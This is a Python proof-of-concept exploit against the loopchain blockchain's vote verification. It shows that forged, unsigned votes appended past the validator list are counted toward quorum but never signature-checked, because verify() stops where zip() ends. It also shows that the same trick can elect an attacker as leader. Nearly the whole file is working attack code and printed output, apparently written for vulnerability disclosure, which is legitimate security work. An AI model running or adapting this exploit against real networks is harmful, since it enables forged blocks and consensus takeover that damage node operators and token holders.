"""
PoC: prev-votes quorum can be reached with UNVERIFIED (forged / unsigned) votes.

Target: icon-project/loopchain @ 41b940e762f8abbffcfdea0da3317c64e6b78ced
        (identical to nightbox33-cloud/loopchain HEAD — fork has no extra commits)

Files under test (real source, loaded from the clone):
  loopchain/blockchain/votes/votes.py        :: Votes.verify()          -> zip() truncation
  loopchain/blockchain/votes/v0_5/votes.py   :: BlockVotes.get_result() -> counts ALL votes
  loopchain/blockchain/blocks/v0_4/block_verifier.py :: verify_prev_votes()
  loopchain/blockchain/blocks/v0_5/block_serializer.py :: _deserialize_body_data()

Quorum arithmetic is read from the real configure_default.py (VOTING_RATIO = 0.67).
"""
import importlib.util
import math
import re
import sys
import types

ROOT = "/home/user/loopchain"

# ---------------------------------------------------------------------------
# Load only the modules under test, bypassing loopchain's service __init__
# (which pulls in grpc/amqp/plyvel and is irrelevant to vote verification).
# ---------------------------------------------------------------------------
STUB_PKGS = {
    "loopchain": f"{ROOT}/loopchain",
    "loopchain.blockchain": f"{ROOT}/loopchain/blockchain",
    "loopchain.blockchain.votes": f"{ROOT}/loopchain/blockchain/votes",
    "loopchain.blockchain.votes.v0_5": f"{ROOT}/loopchain/blockchain/votes/v0_5",
    "loopchain.crypto": f"{ROOT}/loopchain/crypto",
    "loopchain.crypto.hashing": f"{ROOT}/loopchain/crypto/hashing",
    "loopchain.crypto.cert_serializers": f"{ROOT}/loopchain/crypto/cert_serializers",
}
for name, path in STUB_PKGS.items():
    m = types.ModuleType(name)
    m.__path__ = [path]
    sys.modules[name] = m


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


_serializer = load("loopchain.crypto.cert_serializers.serializer",
                  f"{ROOT}/loopchain/crypto/cert_serializers/serializer.py")
sys.modules["loopchain.crypto.cert_serializers"].Serializer = _serializer.Serializer
load("loopchain.crypto.cert_serializers.der_serializer", f"{ROOT}/loopchain/crypto/cert_serializers/der_serializer.py")
load("loopchain.crypto.cert_serializers.pem_serializer", f"{ROOT}/loopchain/crypto/cert_serializers/pem_serializer.py")
sys.modules["loopchain.crypto.cert_serializers"].DerSerializer = sys.modules[
    "loopchain.crypto.cert_serializers.der_serializer"].DerSerializer
sys.modules["loopchain.crypto.cert_serializers"].PemSerializer = sys.modules[
    "loopchain.crypto.cert_serializers.pem_serializer"].PemSerializer

load("loopchain.crypto.hashing.hash_origin_generator", f"{ROOT}/loopchain/crypto/hashing/hash_origin_generator.py")
load("loopchain.crypto.hashing.hash_generator", f"{ROOT}/loopchain/crypto/hashing/hash_generator.py")
_h = sys.modules["loopchain.crypto.hashing"]
_h.HashOriginGenerator = sys.modules["loopchain.crypto.hashing.hash_origin_generator"].HashOriginGenerator
_h.HashGenerator = sys.modules["loopchain.crypto.hashing.hash_generator"].HashGenerator
_h.build_hash_generator = lambda version, salt: _h.HashGenerator(
    _h.HashOriginGenerator() if False else (
        sys.modules["loopchain.crypto.hashing.hash_origin_generator"].HashOriginGeneratorV1()
        if version == 1 else
        sys.modules["loopchain.crypto.hashing.hash_origin_generator"].HashOriginGeneratorV0()), salt)

types_mod = load("loopchain.blockchain.types", f"{ROOT}/loopchain/blockchain/types.py")
ExternalAddress = types_mod.ExternalAddress
Hash32 = types_mod.Hash32
Signature = types_mod.Signature

sig_mod = load("loopchain.crypto.signature", f"{ROOT}/loopchain/crypto/signature.py")
Signer = sig_mod.Signer

vote_mod = load("loopchain.blockchain.votes.vote", f"{ROOT}/loopchain/blockchain/votes/vote.py")
sys.modules["loopchain.blockchain.votes"].Vote = vote_mod.Vote
votes_mod = load("loopchain.blockchain.votes.votes", f"{ROOT}/loopchain/blockchain/votes/votes.py")
sys.modules["loopchain.blockchain.votes"].Vote = vote_mod.Vote
sys.modules["loopchain.blockchain.votes"].Votes = votes_mod.Votes

v05_vote = load("loopchain.blockchain.votes.v0_5.vote", f"{ROOT}/loopchain/blockchain/votes/v0_5/vote.py")
sys.modules["loopchain.blockchain.votes.v0_5"].BlockVote = v05_vote.BlockVote
sys.modules["loopchain.blockchain.votes.v0_5"].LeaderVote = v05_vote.LeaderVote
v05_votes = load("loopchain.blockchain.votes.v0_5.votes", f"{ROOT}/loopchain/blockchain/votes/v0_5/votes.py")
sys.modules["loopchain.blockchain.votes.v0_5"].BlockVote = v05_vote.BlockVote
sys.modules["loopchain.blockchain.votes.v0_5"].LeaderVote = v05_vote.LeaderVote
sys.modules["loopchain.blockchain.votes.v0_5"].BlockVotes = v05_votes.BlockVotes
sys.modules["loopchain.blockchain.votes.v0_5"].LeaderVotes = v05_votes.LeaderVotes

BlockVote = v05_vote.BlockVote
BlockVotes = v05_votes.BlockVotes

# Read VOTING_RATIO straight from the repo so the PoC can't drift from deployed params.
with open(f"{ROOT}/loopchain/configure_default.py") as f:
    VOTING_RATIO = float(re.search(r"^VOTING_RATIO\s*=\s*([0-9.]+)", f.read(), re.M).group(1))

print("=" * 78)
print(f"VOTING_RATIO (from loopchain/configure_default.py) = {VOTING_RATIO}")
print("=" * 78)

# ---------------------------------------------------------------------------
# Setup: 22 main P-Reps (ICON mainnet main P-Rep count), height 1000
# ---------------------------------------------------------------------------
N_REPS = 22
signers = [Signer.new() for _ in range(N_REPS)]
reps = [ExternalAddress.fromhex_address(s.address) for s in signers]

block_height = 1000
block_hash = Hash32(bytes([0xAA]) * 32)
round_ = 0
quorum = math.ceil(VOTING_RATIO * N_REPS)
print(f"\nreps = {N_REPS}   quorum = ceil({VOTING_RATIO}*{N_REPS}) = {quorum}")

# The leader collects ZERO genuine votes (worst case: network split, nobody voted).
# Slots 0..len(reps)-1 are left None, which Votes.verify() skips (`if not vote: continue`).
votes = [None] * N_REPS

# Forged votes appended PAST len(reps): garbage 65-byte signature, arbitrary rep
# address, but block_hash == header.prev_hash so get_result() counts each as "true".
n_forged = quorum
forged_votes = [
    BlockVote(
        rep=ExternalAddress.fromhex_address(Signer.new().address),
        timestamp=0,
        signature=Signature(b"\x39" * 65),       # not a valid signature for anything
        block_height=block_height,
        round=round_,
        block_hash=block_hash,
    )
    for _ in range(n_forged)
]
votes += forged_votes

print(f"prevVotes list len = {len(votes)}   (len(reps) = {N_REPS}, "
      f"overflow = {len(votes) - N_REPS})")
print(f"  genuine votes collected : 0")
print(f"  forged (garbage sig)    : {len(forged_votes)}  at indices "
      f"{N_REPS}..{len(votes) - 1}")

prev_votes = BlockVotes(reps, VOTING_RATIO, block_height, round_, block_hash, votes)

# ---------------------------------------------------------------------------
# [1] Quorum decision — this is what verify_prev_votes() gates on
# ---------------------------------------------------------------------------
result = prev_votes.get_result()
print(f"\n[1] BlockVotes.get_result()  -> {result!r}")
print(f"    verify_prev_votes() requires `get_result() is True` -> "
      f"{'PASS' if result is True else 'REJECT'}")

# ---------------------------------------------------------------------------
# [2] Signature verification
# ---------------------------------------------------------------------------
try:
    prev_votes.verify()
    print("[2] BlockVotes.verify()      -> PASSED (no exception raised)")
    verify_raised = False
except Exception as e:
    print(f"[2] BlockVotes.verify()      -> RAISED {type(e).__name__}: {str(e)[:100]}")
    verify_raised = True

# ---------------------------------------------------------------------------
# [3] Independently prove the forged votes are cryptographically invalid
# ---------------------------------------------------------------------------
print("\n[3] Forged votes verified standalone (each on its own):")
for i, fv in enumerate(forged_votes[:3]):
    try:
        fv.verify()
        print(f"      forged[{i}].verify() -> PASSED (!!)")
    except Exception as e:
        print(f"      forged[{i}].verify() -> REJECTED ({type(e).__name__})")

# ---------------------------------------------------------------------------
# [4] CONTROL: identical forged payload but list truncated to len(reps)
# ---------------------------------------------------------------------------
print("\n[4] CONTROL — same forged votes, but placed INSIDE the zip range (no overflow):")
ctrl = forged_votes[:N_REPS] + [None] * (N_REPS - min(N_REPS, len(forged_votes)))
cv = BlockVotes(reps, VOTING_RATIO, block_height, round_, block_hash, ctrl)
print(f"      len(votes)={len(cv.votes)}  get_result()={cv.get_result()!r}")
try:
    cv.verify()
    print("      verify() -> PASSED (!!)")
except Exception as e:
    print(f"      verify() -> RAISED {type(e).__name__}  <-- forged sigs correctly caught")

# ---------------------------------------------------------------------------
# [5] SAME BUG ON THE LEADER-ELECTION PATH: LeaderVotes
#     blocks/v0_5/block_verifier.py :: verify_leader_votes() requires
#     leader_votes.get_result() == block.header.peer_id.
#     LeaderVotes.get_result() -> get_majority() -> Counter over ALL self.votes,
#     so forged votes past len(reps) can elect an arbitrary leader.
# ---------------------------------------------------------------------------
print("\n[5] LeaderVotes — forging leader election with unverified votes:")
LeaderVote = v05_vote.LeaderVote
LeaderVotes = v05_votes.LeaderVotes

attacker = ExternalAddress.fromhex_address(Signer.new().address)
old_leader = reps[0]

leader_votes_list = [None] * N_REPS
leader_forged = [
    LeaderVote(
        rep=ExternalAddress.fromhex_address(Signer.new().address),
        timestamp=0,
        signature=Signature(b"\x39" * 65),      # garbage signature
        block_height=block_height,
        round=round_,
        old_leader=old_leader,
        new_leader=attacker,                    # elect the attacker as leader
    )
    for _ in range(quorum)
]
leader_votes_list += leader_forged

lv = LeaderVotes(reps, VOTING_RATIO, block_height, round_, old_leader, leader_votes_list)
lv_result = lv.get_result()
print(f"      len(self.votes)={len(lv.votes)} (len(reps)={N_REPS})")
print(f"      get_result() == attacker({attacker.hex_hx()[:14]}...) -> "
      f"{lv_result == attacker}")
try:
    lv.verify()
    print("      verify() -> PASSED (no exception)")
    lv_raised = False
except Exception as e:
    print(f"      verify() -> RAISED {type(e).__name__}: {str(e)[:80]}")
    lv_raised = True

print("\n      Standalone check of forged leader votes:")
for i, fv in enumerate(leader_forged[:2]):
    try:
        fv.verify()
        print(f"        forged_leader[{i}].verify() -> PASSED (!!)")
    except Exception as e:
        print(f"        forged_leader[{i}].verify() -> REJECTED ({type(e).__name__})")

# ---------------------------------------------------------------------------
print("\n" + "=" * 78)
if result is True and not verify_raised:
    print("VERDICT: CONFIRMED — quorum reached with forged votes; verify() still passes.")
    print(f"  {len(forged_votes)} forged/unsigned votes were COUNTED toward quorum;")
    print(f"  0 of them were signature-checked (zip() stopped at len(reps)={N_REPS}).")
    print(f"  LeaderVotes variant: get_result()==attacker -> {lv_result == attacker}, "
          f"verify() raised -> {lv_raised}")
else:
    print("VERDICT: not exploitable as constructed.")
print("=" * 78)
